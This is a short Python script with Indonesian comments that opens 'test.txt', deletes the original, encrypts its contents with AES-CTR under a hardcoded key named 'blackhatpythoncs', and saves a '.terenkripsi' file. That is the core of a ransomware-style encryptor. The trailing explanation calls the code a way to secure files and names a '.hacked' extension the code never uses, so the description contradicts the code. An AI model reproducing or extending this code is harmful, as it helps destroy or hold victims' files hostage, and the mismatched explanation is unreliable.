import os
import pyaes

# Buka file dan baca
nama_file = "test.txt"
file = open(nama_file, "rb")
data_file = file.read()
file.close()

# Hapus file asli
os.remove(nama_file)

# Membuat kunci enkripsi
kunci = b"blackhatpythoncs" # kunci 16 byte
aes = pyaes.AESModeOfOperationCTR(kunci)

# Enkripsi file
data_enkripsi = aes.encrypt(data_file)

# Simpan file terenkripsi
nama_file_baru = nama_file + ".terenkripsi"
file_baru = open(f'{nama_file_baru}', "wb")
file_baru.write(data_enkripsi)
file_baru.close()

# ================================================================= 
# Kode tersebut memiliki tujuan untuk membuka sebuah file teks ("test.txt"), mengenkripsi isinya menggunakan AES (Advanced Encryption Standard) dengan mode operasi CTR (Counter Mode), dan menyimpan hasil enkripsi ke dalam file baru dengan ekstensi ".hacked". Prosesnya terdiri dari langkah-langkah berikut:

# 1. Membuka file "test.txt" dan membaca isinya.
# 2. Menghapus file "test.txt" yang asli.
# 3. Membuat kunci enkripsi menggunakan string "blackhatpythoncs" (kunci harus memiliki panjang 16 byte).
# 4. Mengenkripsi data file menggunakan kunci yang telah dibuat.
# 5. Menyimpan data yang telah terenkripsi ke dalam file baru dengan ekstensi ".hacked".

# Tujuan dari kode ini adalah untuk mengamankan konten file dengan menggunakan enkripsi, sehingga hanya dapat diakses oleh pihak yang memiliki kunci yang sesuai.
